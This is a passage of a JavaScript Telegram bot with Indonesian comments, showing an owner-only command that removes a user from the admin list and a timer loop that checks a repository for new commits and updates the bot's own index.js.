    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "🤬 *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `🙈 User ${userId} is not an admin.`);
    }
});


// ================= AUTO UPDATE LOOP =================
setInterval(async () => {
  if (!autoUpdateEnabled) return;

  try {
    const latestSha = await getLatestCommitSha();

    if (!lastCommitSha) {
      lastCommitSha = latestSha;
      return;
    }

    if (latestSha !== lastCommitSha) {
      console.log("🔄 Auto update detected new commit...");
      lastCommitSha = latestSha;

      const updated = await updateIndexJs();
      if (updated) process.exit(0);
    }
  } catch (err) {
    console.error("Auto update error:", err.message);
  }
}, 2 * 60 * 1000);
// ====================================================
validateToken();
sendNotifAdvanced();
